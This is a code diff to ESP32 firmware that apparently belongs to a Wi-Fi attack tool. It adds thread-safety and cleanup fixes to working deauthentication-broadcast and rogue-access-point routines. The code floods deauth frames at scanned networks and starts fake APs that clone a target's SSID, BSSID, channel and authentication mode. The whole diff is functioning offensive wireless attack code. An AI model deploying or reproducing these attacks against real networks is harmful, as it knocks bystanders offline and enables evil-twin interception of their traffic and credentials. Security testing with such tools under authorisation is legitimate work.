@@ -11,6 +11,8 @@
 #include <cstring>
 #include <string>
 #define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
+#include <mutex>
+
 #include "esp_err.h"
 #include "esp_log.h"
 #include "esp_timer.h"
@@ -20,8 +22,8 @@
 
 namespace {
 const char* LOG_TAG = "main:attack_method";
-esp_timer_handle_t deauth_timer_handle;
-esp_timer_handle_t rogueap_timer_handle;
+esp_timer_handle_t deauth_timer_handle{nullptr};
+esp_timer_handle_t rogueap_timer_handle{nullptr};
 
 ap_records_t gApRecordsForBroadcast;
 
@@ -31,6 +33,7 @@ typedef struct {
   ap_records_t ap_records;
 } multiple_rogue_ap_data_t;
 multiple_rogue_ap_data_t gMmultipleRogueApData;
+std::mutex gMmultipleRogueApDataMutex;
 }  // namespace
 
 extern bool gShouldLimitAttackLogs;
@@ -64,7 +67,7 @@ static void timer_send_deauth_frame(void* arg) {
   }
 
   for (const auto& ap_record : *ap_records) {
-    wsl_bypasser_send_deauth_frame(ap_record);
+    wsl_bypasser_send_deauth_frame(ap_record.get());
   }
 }
 
@@ -72,6 +75,7 @@ static void timer_send_deauth_frame(void* arg) {
  * @details Starts periodic timer for sending deauthentication frame via timer_send_deauth_frame().
  */
 void attack_method_broadcast(const ap_records_t& ap_records, unsigned period_sec) {
+  // Create copy of shared ptrs = share ownership. So, in case someone will rescan APs, these APs will not be deleted
   gApRecordsForBroadcast = ap_records;
 
   esp_timer_create_args_t deauth_timer_args{};
@@ -86,8 +90,16 @@ void attack_method_broadcast(const ap_records_t& ap_records, unsigned period_sec
 }
 
 void attack_method_broadcast_stop() {
-  ESP_ERROR_CHECK(esp_timer_stop(deauth_timer_handle));
-  esp_timer_delete(deauth_timer_handle);
+  if (deauth_timer_handle == nullptr) {
+    // Nothing to stop
+    return;
+  }
+  if (esp_timer_is_active(deauth_timer_handle)) {
+    ESP_ERROR_CHECK(esp_timer_stop(deauth_timer_handle));
+  }
+  ESP_ERROR_CHECK(esp_timer_delete(deauth_timer_handle));
+  deauth_timer_handle = nullptr;
+  gApRecordsForBroadcast = {};
 }
 
 /**
@@ -96,21 +108,15 @@ void attack_method_broadcast_stop() {
 void start_rogue_ap(const wifi_ap_record_t* ap_record) {
   ESP_LOGI(LOG_TAG, "Starting Rogue AP with SSID '%s'", ap_record->ssid);
   wifictl_set_ap_mac(ap_record->bssid);
-  wifi_config_t ap_config = {.ap = {
-                                 "",                                       // SSID
-                                 "dummypassword",                          // Password
-                                 (uint8_t)strlen((char*)ap_record->ssid),  // ssid_len
-                                 ap_record->primary,                       // channel
-                                 ap_record->authmode,                      // authmode
-                                 0,                                        // ssid_hidden
-                                 1,                                        // max_connection
-                                 0,                                        // beacon_interval
-                                 WIFI_CIPHER_TYPE_NONE,                    // pairwise_cipher
-                                 false,                                    // ftm_responder
-                                 {false, false}                            // pmf_cfg
-                             }};
 
-  mempcpy(ap_config.sta.ssid, ap_record->ssid, 32);
+  static const char dummyPassword[] = "dummypassword";
+  wifi_config_t ap_config{};
+  mempcpy(ap_config.ap.ssid, ap_record->ssid, 32);
+  ap_config.ap.ssid_len = (uint8_t)strlen((char*)ap_record->ssid);
+  mempcpy(ap_config.ap.password, dummyPassword, sizeof(dummyPassword));
+  ap_config.ap.channel = ap_record->primary;
+  ap_config.ap.authmode = ap_record->authmode;
+  ap_config.ap.max_connection = 1;
   wifictl_ap_start(&ap_config);
 }
 
@@ -123,11 +129,24 @@ void start_rogue_ap(const wifi_ap_record_t* ap_record) {
  */
 void timer_change_rogue_ap(void* arg) {
   multiple_rogue_ap_data_t* multiple_rogue_ap_data = (multiple_rogue_ap_data_t*)arg;
-  start_rogue_ap(multiple_rogue_ap_data->ap_records[multiple_rogue_ap_data->current_ap_idx]);
-  ++multiple_rogue_ap_data->current_ap_idx;
-  if (multiple_rogue_ap_data->current_ap_idx >= multiple_rogue_ap_data->ap_records.size()) {
-    multiple_rogue_ap_data->current_ap_idx = 0;
+  std::shared_ptr<const wifi_ap_record_t> current_wifi_ap_record_ptr;
+  {
+    std::lock_guard<std::mutex> lock(gMmultipleRogueApDataMutex);
+    if (multiple_rogue_ap_data->ap_records.empty()) {
+      // Looks like global data structure was deleted.
+      return;
+    }
+    current_wifi_ap_record_ptr = multiple_rogue_ap_data->ap_records[multiple_rogue_ap_data->current_ap_idx];
+    ++multiple_rogue_ap_data->current_ap_idx;
+    if (multiple_rogue_ap_data->current_ap_idx >= multiple_rogue_ap_data->ap_records.size()) {
+      multiple_rogue_ap_data->current_ap_idx = 0;
+    }
   }
+
+  // We hold shared_ptr to AP, so, even if rescan will happen in another thread, information about this AP will not be
+  // deleted. In similar way, if stop_attack() is called and multiple_rogue_ap_data->ap_records is deleted, we anyway
+  // have data, untill we destroy this shared_ptr
+  start_rogue_ap(current_wifi_ap_record_ptr.get());
 }
 
 /**
@@ -139,18 +158,24 @@ void timer_change_rogue_ap(void* arg) {
  * @param per_ap_timeout how long to establish each Rogue AP
  */
 void start_multiple_rogue_ap_attack(const ap_records_t& ap_records, uint16_t per_ap_timeout) {
-  gMmultipleRogueApData = {};
-  gMmultipleRogueApData.isAttackInProgress = true;
-  gMmultipleRogueApData.current_ap_idx = 0;
-  gMmultipleRogueApData.ap_records = ap_records;
+  void* timerData{nullptr};
+  {
+    std::lock_guard<std::mutex> lock(gMmultipleRogueApDataMutex);
+    gMmultipleRogueApData = {};
+    gMmultipleRogueApData.isAttackInProgress = true;
+    gMmultipleRogueApData.current_ap_idx = 0;
+    // Create copy of shared ptrs = share ownership. So, in case someone will rescan APs, these APs will not be deleted
+    gMmultipleRogueApData.ap_records = ap_records;
+    timerData = &gMmultipleRogueApData;
+  }
 
   esp_timer_create_args_t rogueap_timer_args{};
   rogueap_timer_args.callback = &timer_change_rogue_ap;
-  rogueap_timer_args.arg = (void*)&gMmultipleRogueApData;
+  rogueap_timer_args.arg = timerData;
   ESP_ERROR_CHECK(esp_timer_create(&rogueap_timer_args, &rogueap_timer_handle));
 
   // Call for the first time
-  timer_change_rogue_ap(&gMmultipleRogueApData);
+  timer_change_rogue_ap(timerData);
 
   ESP_ERROR_CHECK(esp_timer_start_periodic(rogueap_timer_handle, per_ap_timeout * 1000000));
 }
@@ -164,7 +189,12 @@ void start_multiple_rogue_ap_attack(const ap_records_t& ap_records, uint16_t per
  * @param per_ap_timeout how long to establish each Rogue AP
  */
 void attack_method_rogueap(const ap_records_t& ap_records, uint16_t per_ap_timeout) {
-  if (gMmultipleRogueApData.isAttackInProgress == true) {
+  bool isAttackInProgress{false};
+  {
+    std::lock_guard<std::mutex> lock(gMmultipleRogueApDataMutex);
+    isAttackInProgress = gMmultipleRogueApData.isAttackInProgress;
+  }
+  if (isAttackInProgress == true) {
     ESP_LOGE(LOG_TAG, "Failed to start RogueAP attack: previous attack is not finished yet");
     return;
   }
@@ -175,13 +205,21 @@ void attack_method_rogueap(const ap_records_t& ap_records, uint16_t per_ap_timeo
     return;
   }
 
-  start_rogue_ap(ap_records[0]);
+  start_rogue_ap(ap_records[0].get());
 }
 
 void attack_method_rogueap_stop() {
-  ESP_ERROR_CHECK(esp_timer_stop(rogueap_timer_handle));
-  esp_timer_delete(rogueap_timer_handle);
-  gMmultipleRogueApData = {};
+  if (rogueap_timer_handle != nullptr) {
+    if (esp_timer_is_active(rogueap_timer_handle)) {
+      ESP_ERROR_CHECK(esp_timer_stop(rogueap_timer_handle));
+    }
+    ESP_ERROR_CHECK(esp_timer_delete(rogueap_timer_handle));
+    rogueap_timer_handle = nullptr;
+  }
+  {
+    std::lock_guard<std::mutex> lock(gMmultipleRogueApDataMutex);
+    gMmultipleRogueApData = {};
+  }
 
   wifictl_mgmt_ap_start();
   wifictl_restore_ap_mac();
